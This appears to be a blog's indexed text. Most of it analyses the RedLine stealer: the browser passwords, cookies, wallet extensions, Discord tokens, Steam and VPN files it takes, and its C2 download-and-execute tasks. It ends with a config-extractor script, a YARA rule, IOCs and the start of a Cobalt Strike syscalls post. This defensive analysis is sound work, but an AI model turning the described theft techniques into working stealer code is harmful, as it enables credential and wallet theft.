endpointConnection.RequestConnection and wait for the response. ","date":"2023-09-12","objectID":"/redline/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Malware Configuration The malware continues to prepare some structures and objects. The next thing is to declare ScanningArgs Class to hold the types of information that the stealer will grab. The configuration is received from the C2 Server. And ScanResult structure to hold some collected information about the victim machine. The following snippet is a cleaned version of the ScanningArgs Class. [DataContract(Name = \"ScanningArgs\", Namespace = \"BrowserExtension\")] public class ScanningArgs { [DataMember(Name = \"ScanBrowsers\")] public bool ScanBrowsers { get; set; } [DataMember(Name = \"ScanFiles\")] public bool ScanFiles { get; set; } [DataMember(Name = \"ScanFTP\")] public bool ScanFTP { get; set; } [DataMember(Name = \"ScanWallets\")] public bool ScanWallets { get; set; } [DataMember(Name = \"ScanScreen\")] public bool ScanScreen { get; set; } [DataMember(Name = \"ScanTelegram\")] public bool ScanTelegram { get; set; } [DataMember(Name = \"ScanVPN\")] public bool ScanVPN { get; set; } [DataMember(Name = \"ScanSteam\")] public bool ScanSteam { get; set; } [DataMember(Name = \"ScanDiscord\")] public bool ScanDiscord { get; set; } [DataMember(Name = \"ScanFilesPaths\")] public List\u003cstring\u003e ScanFilesPaths { get; set; } [DataMember(Name = \"BlockedCountry\")] public List\u003cstring\u003e BlockedCountry { get; set; } [DataMember(Name = \"BlockedIP\")] public List\u003cstring\u003e BlockedIP { get; set; } [DataMember(Name = \"ScanChromeBrowsersPaths\")] public List\u003cstring\u003e ScanChromeBrowsersPaths { get; set; } [DataMember(Name = \"ScanGeckoBrowsersPaths\")] public List\u003cstring\u003e ScanGeckoBrowsersPaths { get; set; } } The following snippet is a cleaned version of the ScanResult structure. [DataContract(Name = \"ScanResult\", Namespace = \"BrowserExtension\")] public struct ScanResult { [DataMember(Name = \"Hardware\")] public string Hardware { get; set; } [DataMember(Name = \"ReleaseID\")] public string ReleaseID { get; set; } [DataMember(Name = \"MachineName\")] public string MachineName { get; set; } [DataMember(Name = \"OSVersion\")] public string OSVersion { get; set; } [DataMember(Name = \"Language\")] public string Language { get; set; } [DataMember(Name = \"ScreenSize\")] public string ScreenSize { get; set; } [DataMember(Name = \"ScanDetails\")] public ScanDetails ScanDetails { get; set; } [DataMember(Name = \"Country\")] public string Country { get; set; } [DataMember(Name = \"City\")] public string City { get; set; } [DataMember(Name = \"TimeZone\")] public string TimeZone { get; set; } [DataMember(Name = \"IPv4\")] public string IPv4 { get; set; } [DataMember(Name = \"Monitor\")] public byte[] Monitor { get; set; } [DataMember(Name = \"ZipCode\")] public string ZipCode { get; set; } [DataMember(Name = \"FileLocation\")] public string FileLocation { get; set; } [DataMember(Name = \"SeenBefore\")] public bool SeenBefore { get; set; } } The ID (ReleaseID) from the configuration is used in this structure with collected information. ","date":"2023-09-12","objectID":"/redline/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Malware Core The next call to ResultFactory.sl9HSDF234 is used to populate these structures with collected data. It instantiated ScanDteails object that stores information about the grabbed information as shown in the Variables names. ","date":"2023-09-12","objectID":"/redline/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Geo location harvester and filter The Method ResultFactory.AKSFD8H23 is used to populate the ScanResult structure that stores information about the victim machine. The Important thing here is GeoHelper.Get method that populates the GeoInfo object. The malware uses public websites to get information about the Geo location of the IP address by making a request to the website and parsing the response data. It tries three websites: https[://]api.ip[.]sb/geoip https[://]ipinfo[.]io/ip https[://]api.ipify[.]org If any information were missing, it would be replaced with UNKNOWN. The Country and IP are checked against a Block List of countries and IPs that the malware gets from the configuration received from the C2 server. If There are any matches, the malware does not continue and exits immediately. ","date":"2023-09-12","objectID":"/redline/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Real Stealer Action Method ResultFactory.Actions has some some other calls; it is the start of collecting victim info. This is how it looks like; each line of code contains a method call that collects a set of information. The names will be changed to some meaningful names as we go on. ","date":"2023-09-12","objectID":"/redline/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Collecting Victim machine Information Method ResultFactory.asdkadu8 is used to get information about the victim computer: The user domain name The computer name using WindowsIdentity.GetCurrent().Name Computer serial number using WMI Query SELECT * FROM Win32_DiskDrive and then get the serial number from the return data. The MD5 checksum is calculated to the concatenated string. The value is then stored in Hardware member. The next method is ResultFactory.sdfo8n234 As shown, it gets the location of the loaded assembly (Current EXE file) and stored in FileLocation member. The next is ResultFactory.sdfi35sdf It collects the following information. computer Language (Keyboard layout) using InputLanguage.CurrentInputLanguage.Culture.EnglishName and stores the result in Language member. The Time Zone using TimeZoneInfo.Local.DisplayName which get the readable name of the time zone for example (UTC-08:00) Pacific Time (US \u0026 Canada) and the value is stored in TimeZone member. The display Resolution using DisplayHelper.GetDisplayResolution() and format it in \u003cWIDTH\u003ex\u003cHEIGHT\u003e, the value is then stored in ScreenSize member. The Windows OS Version using SystemInfoHelper.GetWindowsVersion() and stores the result in OSVersion member. It decides if the architecture x86 or x64 using Environment.Is64BitOperatingSystem And to get the computer build and version info, It Query two registry values: SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProductName SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\CSDVersion The values are then concatenated to form \u003cWIN_VERSION_INFO\u003e \u003cARCH\u003e. Then, the method ResultFactory.sdf934asd is called. It gets the computer name and stores it in MachineName member. The next is ResultFactory.asdk9345asd It gets information about the CPU using GetProcessors() that execute the Same WMI Query SELECT * FROM Win32_Processor and retrieves the name and number of cores from the result. The CPU info is stored in SystemHardwares with specifying HardwareType to be HardwareType.Processor (The other value is Graphics) The next method ResultFactory.a03md9ajsd Add another element to HardwareType member. It adds graphics card information using SystemInfoHelper.GetGraphicCards() which works the same way as SystemInfoHelper.GetProcessors(). It executes WMI Query to get the graphics card information SELECT * FROM Win32_VideoController, and it stores the Adapter RAM and Name to HardwareType . ","date":"2023-09-12","objectID":"/redline/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Collect Installed Browsers The next one is ResultFactory.asdk8jasd. This method calls SystemInfoHelper.GetBrowsers() which as the name implies, Gets the Browsers. It gets the list of all installed Browsers by querying the subkey \"SOFTWARE\\\\WOW6432Node\\\\Clients\\\\StartMenuInternet\" which contains a subkey for every installed browser. Then it loops over all the subkeys and gets the name, the executable path, and the version. The result is then stored at a Class to keep the Browser information: [DataContract(Name = \"BrowserVersion\", Namespace = \"BrowserExtension\")] public class BrowserVersion { [DataMember(Name = \"NameOfBrowser\")] public string NameOfBrowser { get; set; } [DataMember(Name = \"Version\")] public string Version { get; set; } [DataMember(Name = \"PathOfFile\")] public string PathOfFile { get; set; } } The next method is ResultFactory.лыв7рыва2 It makes a new instance of SystemHardware class and fills it with the RAM size. [DataContract(Name = \"SystemHardware\", Namespace = \"BrowserExtension\")] public class SystemHardware { [DataMember(Name = \"Name\")] public string Name { get; set; } [DataMember(Name = \"Counter\")] public string Counter { get; set; } [DataMember(Name = \"HardType\")] public HardwareType HardType { get; set; } the function SystemInfoHelper.TotalOfRAM() gets the total amount of RAM using WMI Query \"SELECT * FROM Win32_OperatingSystem\" by reading TotalVisibleMemorySize of the resulted structure. ","date":"2023-09-12","objectID":"/redline/:2:9","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Capture Installed Programs and Firewall services. The next method is ResultFactory.ылв92р34выа, which calls SystemInfoHelper.ListOfPrograms() It opens the Registry key SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall which has a subkey for every program installed on the system. It then opens every subkey and gets the Display Name of the program and the Version installed. The values are then added to an ordered list and stored in ScanDetails.Softwares. The next call is to ResultFactory.аловй which just calls SystemInfoHelper.GetFirewalls() It uses WMI to get information about Firewalls, Antiviruses and AntiSpyWare. There is some kind of obfuscation as it adds WindowsService into the strings and then will be replaced. So, the values are. SELECT * FROM AntivirusProduct SELECT * FROM AntiSpyWareProduct SELECT * FROM FisrewallProduct And limiting the searching scope to ROOT\\\\SecurityCenter2, ROOT\\\\SecurityCenter namespaces which are not documented by Microsoft, but It Holds information about security solutions installed. The malware then stores the Display name of the security solution found and its version in an ordered list.ScanDetails.SecurityUtils. ","date":"2023-09-12","objectID":"/redline/:2:10","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Capture Running Processes The next function is ResultFactory.ыал8р45 which calls SystemInfoHelper.ListOfProcesses() It uses WMI to get the list of running processes using the query SELECT * FROM Win32_Process Where SessionId='\u003cSESSION_ID\u003e, the session ID is retrieved from Process.GetCurrentProcess().SessionId which get the session ID for all the currently running processes. It stores ProcessesID , Process Name and CommandLine for each process. Then it will be stored in a list and saved to ScanDetails.Processes . The next method is ResultFactory.ываш9р34 which calls SystemInfoHelper.AvailableLanguages() This method is used to construct a list of all the installed Input languages and stored then in ScanDetails.AvailableLanguages ","date":"2023-09-12","objectID":"/redline/:2:11","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Screenshot capturer The Next method is ResultFactory.длвап9345 which calls DisplayHelper.Parse() This method is used to copy the content of the screen to a bitmap object (Takes a screenshot) and then convert the bitmap to an array of bytes (DisplayHelper.ImageToByte(bitmap)) and then stores the resulting array in Monitor member. ","date":"2023-09-12","objectID":"/redline/:2:12","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal Telegram Data The next method is ResultFactory.ывал8н34 It checks if the member ScanTelegram member is set to True in the configuration. It it is the case, it instantiate an object from FileScannerRule . The function FileScanner.Scan did the scan work. in general, it gets all the files that met the specified pattern received from the C2 server. The file contents are saved Body attribute in ScannedFile class. PathOfFile , NameOfFile , NameOfApplication and DirOfFile of the target pattern are also stored. The malware uses Overwrite property in the methods so, this might be misleading as there are multiple implementations of the same method. The first one is GetScanArgs This function is used to get the directory of telegram data tdata. It uses the information of the running Telegram process. If it fails, it will use the default installation path in the APPDATA folder. The second method is GetFolder which gets the Profile directory of the logged user. If it fails, it uses Profile_Unknown as default path. ","date":"2023-09-12","objectID":"/redline/:2:13","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal Browsers Data The Next function is ResultFactory.вал93тфыв It checks for ScanBrowsers in the configuration. Then it calls .Scan() with the scan settings. All chromium-based browsers are handled by the first method which takes the paths of the target browsers as an argument. The malware looks for Login Data, Web Data and Cookies for each browser in the list. To copy these files, it calls a helper function FileCopier.FindPaths . The function FindPaths build the path to App Data,Program Files and Program Files (x86). Then, it loops over all the files in every path of the paths list. Looking for the file names passed (Last argument). and then saves the full path to the file in a list. Back to the Scan function, now text2 in the loop will be the full path to Login Data, Web Data or Cookies file. Then it instantiates an object from ScannedBrowser class to hold the information collected. [DataContract(Name = \"ScannedBrowser\", Namespace = \"BrowserExtension\")] public class ScannedBrowser { [DataMember(Name = \"BrowserName\")] public string BrowserName { get; set; } [DataMember(Name = \"BrowserProfile\")] public string BrowserProfile { get; set; } [DataMember(Name = \"Logins\")] public IList\u003cAccount\u003e Logins { get; set; } [DataMember(Name = \"Autofills\")] public IList\u003cAutofill\u003e Autofills { get; set; } [DataMember(Name = \"CC\")] public IList\u003cCC\u003e CC { get; set; } [DataMember(Name = \"Cookies\")] public IList\u003cScannedCookie\u003e Cookies { get; set; } It then checks the name of browser, if it contains Opera GX Stable set the BrwoserName to Opera GX. If it is not the case, it is a chromium-based browser so, it changes the path of the files to %USERPROFILE%\\\\AppData\\\\Roaming\\\\\u003cBROWSER_NAME\u003e and AppData\\\\Local\\\\ if it returns an error. It gets the profile name by parsing the folder name before User Data folder and stores it in BrowserProfile . In the case of Chromium based browsers, this will be the browser name. Then, it saves the target data of the browsers’ local saved data. It looks for Passwords, Cookies, Autofill fields and Credit Card information The first method in the browser stealer module is ScanPasswords() First it adds Login Data to the passed path to get a full path which contains the encrypted passwords. It then calls C_h_r_o_m_e.ParseLocalStateKey() method. ParseLocalStateKey is used to look for Local State or LocalPrefs.json files. Then, it retrieves the encrypted_key from os_crypt member, this key will be used later to crack the saved passwords. Back to ScanPasswords , the next step to crack the passwords is to open Login Data database. but first it copies the file to temporary directory. After opening Login Data, it reads logins table. For each entry, it uses Account class instance to hold its information. [DataContract(Name = \"Account\", Namespace = \"BrowserExtension\")] public class Account { [DataMember(Name = \"URL\")] public string URL { get; set; } [DataMember(Name = \"Username\")] public string Username { get; set; } [DataMember(Name = \"Password\")] public string Password { get; set; } } URL and Username are in clear text. The Password is encrypted, to decrypt it, uses C_h_r_o_m_e.DecryptChromium and passing the encrypted password and the previously saved encrypted_key . The Result of the entire process is a clear text password and usernames associated with a URL, it saved in scannedBrowser.Logins . The next method in the browser stealer module is C_h_r_o_m_e.ScanCook It gets the path to Cookies database by appending Cookies to the User Data full path. This is not valid path to the cookies database now, it moved to Default\\Network under User Data Directory. Assuming it is right (In older version or any other reason) It opens a database connection to the copied Cookies file and gets its information to ScannedCookie class. [DataContract(Name = \"ScannedCookie\", Namespace = \"BrowserExtension\")] public class ScannedCookie { [DataMember(Name = \"Host\")] public string Host { get; set; } [DataMember(Name = \"Http\")] public bool Http { get; set;","date":"2023-09-12","objectID":"/redline/:2:14","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"File Grabber The next function in the Actions is ResultFactory.вашу0л34 This method is used to grab files from the victim machine -If enabled-. The RecoursiveFileGrabber.Scan method is used to look for the file pattern in all the logical drives. If the file is found in any place on the system. It creates an object of ScannedFile class. The body (Content) of the file is copied using the constructor method. Other information like PathOfFile , NameOfFile and DirOfFile are stored in the created object. This information is stored back into ScanDetails.ScannedFiles list. ","date":"2023-09-12","objectID":"/redline/:2:15","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal FTP credentials The next method is ResultFactory.навева It scans for Filezilla FTP server (if enabled in the configuration) using FileZilla.Scan() It looks for FileZilla directory in the App Data folder. Specifically, it searches for recentservers.xml and sitemanager.xml. For both, it calls FileZilla.ScanCredentials which loads the XML file and calls FileZilla.GetRecent to get the information stored in the XML file. It stores the FTP server information in Account object: [DataContract(Name = \"Account\", Namespace = \"BrowserExtension\")] public class Account { [DataMember(Name = \"URL\")] public string URL { get; set; } [DataMember(Name = \"Username\")] public string Username { get; set; } [DataMember(Name = \"Password\")] public string Password { get; set; } } The URL is holding the URL\u003c:PORT\u003e and the username and password in their fields. ","date":"2023-09-12","objectID":"/redline/:2:16","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal Crypto Wallets The next method is ResultFactory.ащы9р34 It creates ScannedFile object that will be used to copy the found target files and its metadata. It looks for Crypto wallets. The method browserExtensionsRule.ScanPaths is used to prepare a dictionary of the crypto-wallets browser extensions names and addresses. The method looks for a large set of extensions. ffnbelfdoeiohenkjibnmadjiehjhajb YoroiWallet ibnejdfjmmkpcnlpebklmnkoeoihofec Tronlink jbdaocneiiinmjbjlgalhcelgbejmnid NiftyWallet nkbihfbeogaeaoehlefnkodbefgpgknn Metamask afbcbjpbpfadlkmhmclhkeeodmamcflc MathWallet hnfanknocfeofbddgcijnmhnfnkdnaad Coinbase fhbohimaelbohpjbbldcngcnapndodjp BinanceChain odbfpeeihdkbihmopkbjmoonfanlbfcl BraveWallet hpglfhgfnhbgpjdenjgmdgoeiappafln GuardaWallet blnieiiffboillknjnepogjhkgnoapac EqualWallet cjelfplplebdjjenllpjcblmjkfcffne JaxxxLiberty fihkakfobkmkjojpchpfgcmhfjnmnfpi BitAppWallet kncchdigobghenbbaddojjnnaogfppfj iWallet amkmjjmmflddogmhpjloimipbofnfjih Wombat fhilaheimglignddkjgofkcbgekhenbh AtomicWallet nlbmnnijcnlegkjjpcfjclmcfggfefdm MewCx nanjmdknhkinifnkgdcggcfnhdaammmj GuildWallet nkddgncdjgjfcddamfgcmfnlhccnimig SaturnWallet fnjhmkhhmkbjkkabndcnnogagogbneec RoninWallet Then, it reuses FileScanner.Scan to scan for the extensions. It adds some Rules or patterns for the search which are all the mentioned extensions and some other applications in the following list: The result data is stored in ScanDetails.ScannedWallets (All the folders are on App Data Directory) Wallet Name Target Files Armory Any file with .wallet extension in \\Armory folder Atomic All files in \\atomic folder Coinomi All files in \\Coinomi folder Electrum All files in \\Electrum\\wallets folder Ethereum All files in \\Ethereum\\wallets folder Exodus Exodus\\exodus.wallet and Any .JSON file in Exodus folder Guarda All files in \\Guarda folder Jaax \\com.liberty.jaxx All Wallets: wallet.dat in App Data and App Data Local Any file contains wallet in it. Browser Extensions Extensions Folder in the browser Data Folder ","date":"2023-09-12","objectID":"/redline/:2:17","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal Discord Tokens The next method is ResultFactory.ыва83о4тфыв It is used to steal Discord tokens, this is done by DiscordRule.GetTokens() It scans the %appdata%\\\\discord\\\\Local Storage\\\\leveldb It searches for any .log and .db file in the discord app folder. And it uses the following Regex to filter out the result and get a specific wanted pattern [A-Za-z\\\\d]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{27} The patterns get the data in format \u003c24 digit and letter\u003e.\u003c6 letters, digits or hyphens\u003e.\u003c27 letter, digit or hyphen\u003e . This pattern is matching for Discord Tokens. These Tokens are stored in scanDetails.GameChatFiles . ","date":"2023-09-12","objectID":"/redline/:2:18","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal Steam data The next Function is ResultFactory.askd435. The GameLauncherRule object two methods. GetFolder and GetScanArgs which are used in the same Scan Method. It Reads the registry value Software\\\\Valve\\\\Steam\\\\SteamPath to get the installation path of Steam. It adds **ssfn** as a searching pattern which searches for any file contains ssfn string. The ssfn files are used to login to steam account without 2FA. It adds another search target is config inside steam installation Directory and looks for .vdf files. Which stores metadata about the games installed and installation scripts. ","date":"2023-09-12","objectID":"/redline/:2:19","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Steal VPN credentials The last method is ResultFactory.sdi845sa It makes a list of Nord VPN accounts, but the stealing functionality is not present. It initiates two scans: one for OpenVPN files and the second for ProtonVPN. First, OpenVPNRule . it scans the folder %USERPROFILE%\\\\AppData\\\\Roaming\\\\OpenVPNConnect\\\\profiles for any .ovpn files. The stolen files will be stored in ScanDetails.Open. Second, ProtonVPNRule . It scans the folder %USERPROFILE%\\\\AppData\\\\Local\\\\ProtonVPN for any .ovpn files. The stolen files will be stored in ScanDetails.Open. This is the end of the Stealing functionality in the malware. And here is the action object After renaming the methods to represent its functionality. ","date":"2023-09-12","objectID":"/redline/:2:20","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"All targeted data The Data that the stealer is targeting can be summarized in the following table: Attribute Type Value IPv4 String Victim’s IP address City String Victim’s City Country String Victim’s Country ZipCode String Victim’s Zip Code Hardware String MD5 hash of (User Domain + Username + Serial number) Used as a unique parameter of the victim. FileLocation String The path of the malware Language String The language the victim machine TimeZone String The time zone of the victim machine ScreenSize String Screen size x OSVersion String Windows version running on the victim machine MachineName String Name of the logged in user ScanDetails.SystemHardwares List Hardware information. CPU, GPU, and RAM ScanDetails.InstalledBrowsers List List of all browsers installed ScanDetails.Softwares List List of all installed programs ScanDetails.SecurityUtils List List of all installed firewalls, antivirus, and antispyware ScanDetails.Processes List List of all running processes ScanDetails.AvailableLanguages List List of all languages on the victim machine (Keyboard layouts used) Monitor Byte Array Screenshot from the victim machine ScanDetails.MessageClientFiles List List of stolen files from Telegram data files ScanDetails.Browsers List List of ScannedBrowers object that saves the stolen data from the installed browsers. ScanDetails.ScannedFiles List List of files to be sent to the attacker (File names and petterns recieved from C2 server) ScanDetails.FtpConnections List List of Account object that stores the stolen credentials from FileZilla FTP server -if installed- ScanDetails.ScannedWallets List List of stolen crypto-wallets local file and extensions data ScanDetails.GameChatFiles List List of stolen discord tokens ScanDetails.GameLauncherFiles List List of stolen steam account data and authentication files ScanDetails.NordAccounts List List if Account object that stores stolen Nord VPN account credentials -Not Implemented- ScanDetails.Open List List of Open VPN files (.ovpn) ScanDetails.Proton List List of Proton VPN files (.ovpn) ","date":"2023-09-12","objectID":"/redline/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Is it infected? After collecting the user data. The malware does a check to see if the system is already infected or not. It checks the folder Yandex\\\\Yaddon in the App Data folder. If the Folder exists, it returns True which means that it’s already infected. If it does not exist, returns False which means that it is not infected. So, it adds the directory as a mark of infection. ","date":"2023-09-12","objectID":"/redline/:3:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Additional Features: Task runner and update manager The Next Step is to Send the collected data. So, it makes HTTP request to the Opened connection to the C2 server with the collected data. The malware can receive malware updates and tasks from the C2 server. The received task parameters stored in UpdateTask object. [DataContract(Name = \"UpdateTask\", Namespace = \"BrowserExtension\")] public class UpdateTask { [DataMember(Nam e = \"TaskID\")] public int TaskID { get; set; } [DataMember(Name = \"TaskArg\")] public string TaskArg { get; set; } [DataMember(Name = \"Action\")] public UpdateAction Action { get; set; } [DataMember(Name = \"DomainFilter\")] public string DomainFilter { get; set; } } The TaskAction Enum contains: [DataContract(Name = \"RemoteTaskAction\")] public enum UpdateAction { [EnumMember] Download, [EnumMember] RunPE, [EnumMember] DownloadAndEx, [EnumMember] OpenLink, [EnumMember] Cmd } The tasks are Executed by TaskResolver method. The Actions it can take are: CommandLineUpdate Starts a new hidden CMD to execute received file and command in TaskArg . DownloadUpdate Download a file from a specified URL (or IP). The file location and source URL are specified in TaskArg with | is a separator between them. DownloadAndExecuteUpdate Downloads with the same method of DownloadUpdate And executes it once it is downloaded. OpenUpdate Opens a process to execute the received update file. And with that, we’ve reached the end of the analysis of Redline Steal. ","date":"2023-09-12","objectID":"/redline/:3:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Config Extractor I’ve tried to match the config using yara-python module, and extract mdtokens but all the .NET parser -in python- does not keep the alignment and offsets that in the .NET header. All user string accumulated in array so, token index is not usefull. The current solution matching for the pattern of the strings: Base64 string followed by Base64 string followed by an empty string. This will work for a similar pattern but could be broken easily. import argparse import re import base64 from dotnetfile import DotNetPE ## slightly modified from RussianPanda base64 regex to match strings that are 15 or more characters long base64_regex = r'^(?!.*/)(?=.{15,})(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$' def XOR(data, key): out = '' for i in range(len(data)): out +=chr(data[i] ^ ord(key[i % len(key)]) ) return out def decrypt_config(user_strings, i): config = {} IP = user_strings[i] ID = user_strings[i+1] key = user_strings[i+3] config['IP'] = base64.b64decode(XOR(base64.b64decode(IP), key)) config['ID'] = base64.b64decode(XOR(base64.b64decode(ID), key)) config['key'] = key return config def print_config(config): print('Config:') print('-'*40) print('IP: {}'.format(config['IP'].decode('utf-8'))) print('ID: {}'.format(config['ID'].decode('utf-8'))) print('Key: {}'.format(config['key'])) def main(): parser = argparse.ArgumentParser(description='RedLine config extractor') parser.add_argument('-f', '--file', help='Path to the PE file', required=True) args = parser.parse_args() try: dotnet_file = DotNetPE(args.file) user_strings = dotnet_file.get_user_stream_strings() for i in range(len(user_strings)): # match for two base64 strings in a row with a blank line after them if re.match(base64_regex, user_strings[i]) and re.match(base64_regex, user_strings[i+1]) and user_strings[i+2] == '': config = decrypt_config(user_strings, i) print_config(config) return print(\"No matches found\") except Exception as e: print(\"Unexpected error:\") print('Error: {}'.format(e)) if __name__ == '__main__': main() Usage: ","date":"2023-09-12","objectID":"/redline/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"YARA rule RedLine_Stealer { meta: malware = \"Redline Stealer\" hash = \"\" author = \"d01a\" description = \"detect RedLine Stealer\" strings: $s0 = { 72 ?? ?? ?? 70 // IL_0007: ldstr \"Hj0tHSAtXRsfKkAQIDowVR4tOVshFCRe\" /* 70000424 */ 7D ?? ?? ?? 04 // IL_000c: stfld string EntryPoint::IP /* 0400000C */ 02 // IL_0011: ldarg.0 72 ?? ?? ?? 70 // IL_0012: ldstr \"NSEmHDY5ERU1LRNV\" /* 70000466 */ 7D ?? ?? ?? 04 // IL_0017: stfld string EntryPoint::ID /* 0400000D */ 02 // IL_001c: ldarg.0 72 ?? ?? ?? 70 // IL_001d ldstr \"\" /* 70000422 */ 7D ?? ?? ?? 04 // IL_0022: stfld string EntryPoint::Message /* 0400000E */ 02 // IL_0027: ldarg.0 72 ?? ?? ?? 70 // IL_0028: ldstr \"Pythonic\" /* 70000488 */ 7D ?? ?? ?? 04 // IL_002d: stfld string EntryPoint::Key /* 0400000F */ } $s1 = \"Yandex\\\\YaAddon\" wide $s2 = \"Recoursive\" ascii $s3 = \"GameLauncherRule\" ascii $s4 = \"FileScannerRule\" ascii $s5 = \"SystemInfoHelper\" ascii $s6 = \"ResultFactory\" ascii $s7 = \"get_encrypted_key\" ascii $s8 = \"ChromeGetLocalName\" ascii condition: uint16(0) == 0x5A4D and (uint32(uint32(0x3C)) == 0x00004550) and 5 of them } Hybrid-analysis search result Free Automated Malware Analysis Service - powered by Falcon Sandbox - Search results from HA Community Files (hybrid-analysis.com) ","date":"2023-09-12","objectID":"/redline/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"IOCs IOC Description d1fe4cf589c8852fbc60fdcdc39bf944e27ccc2ae634b98ee841d9a9c4c6f55f SHA256 of sample2 file e90f6d0a7b7d0f23d0b105003fce91959c2083c23394b5cf43101c84ae8be4d2 SHA256 of the unpacked payload 46.8.19[.]196[:]53773 C2 server C:\\Users\\\\AppData\\Local\\Yandex\\Taddon Path used to check previous infection ","date":"2023-09-12","objectID":"/redline/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"MITRE ATT\u0026CK Initial Access https://attack.mitre.org/techniques/T1189/ Drive-by Compromise https://attack.mitre.org/techniques/T1566/ Phishing Execution https://attack.mitre.org/techniques/T1059/003/ Command and Scripting Interpreter: Windows Command Shell https://attack.mitre.org/techniques/T1204/002/ User Execution: Malicious File https://attack.mitre.org/techniques/T1047/ Windows Management Instrumentation Defense Evasion https://attack.mitre.org/techniques/T1564/003/ Hide Artifacts: Hidden Window Credential Access https://attack.mitre.org/techniques/T1555/003/ Credentials from Password Stores: Credentials from Web Browsers, https://attack.mitre.org/techniques/T1606/001/ Forge Web Credentials: Web Cookies https://attack.mitre.org/techniques/T1528/ Steal Application Access Token https://attack.mitre.org/techniques/T1539/ Steal Web Session Cookie Discovery https://attack.mitre.org/techniques/T1087/001/ Account Discovery: Local Account https://attack.mitre.org/techniques/T1217/ Browser Information Discovery https://attack.mitre.org/techniques/T1057/ Process Discovery https://attack.mitre.org/techniques/T1012/ Query Registry https://attack.mitre.org/techniques/T1082/ System Information Discovery https://attack.mitre.org/techniques/T1614/ System Location Discovery https://attack.mitre.org/techniques/T1124/ System Time Discovery https://attack.mitre.org/techniques/T1007/ System Service Discovery Collection https://attack.mitre.org/techniques/T1005/ Data from Local System https://attack.mitre.org/techniques/T1113/ Screen Capture Command and Control https://attack.mitre.org/techniques/T1071/001/ Application Layer Protocol: Web Protocols https://attack.mitre.org/techniques/T1105/ Ingress Tool Transfer https://attack.mitre.org/techniques/T1571/ Non-Standard Port Exfiltration https://attack.mitre.org/techniques/T1041/ Exfiltration Over C2 Channel ","date":"2023-09-12","objectID":"/redline/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"References Understanding Common Intermediate Language (CIL) - CodeProject https://www.ntcore.com/files/dotnetformat.htm https://github.com/pan-unit42/dotnetfile https://7d2dsdx.github.io/Tutorials/index.html?OpCodesExample.html https://n1ght-w0lf.github.io/tutorials/yara-for-config-extraction/ ","date":"2023-09-12","objectID":"/redline/:8:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Reverse Engineering","Research"],"content":"Exploring the Concepts of Direct and Indirect Syscalls, and Reverse Engineering Syscalls implementation in Cobalt Strike","date":"2023-08-18","objectID":"/syscalls/","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":" In case images fail to load, it might be due to jsDelivr CDN ban in Egypt. To resolve this, consider using a VPN. :) ","date":"2023-08-18","objectID":"/syscalls/:0:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt 